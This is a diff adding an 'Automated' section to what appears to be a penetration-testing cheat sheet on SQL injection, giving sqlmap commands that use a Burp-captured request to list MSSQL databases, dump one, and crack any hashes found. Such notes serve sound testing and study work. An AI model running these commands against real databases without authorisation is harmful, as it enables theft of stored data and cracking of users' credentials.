@@ -644,3 +644,18 @@ Dump database names
         namesOfDatabases.append(currentDbName)
     print("Databases: " + str(namesOfDatabases))
 
+## Automated
+
+### 1) SQLmap
+
+Capture request with Burp Suite by right-clicking on the request, then save as a file. Then you can use the request file with SQLmap to proceed with the SQL injection.
+
+Dump database name
+
+    sqlmap -r req --dbms mssql --dbs
+
+Dump database 
+
+    sqlmap -r req --dbms mssql -D dbname --dump
+
+SQLmap can also crack any hashes it detects after it finishes the database dump.
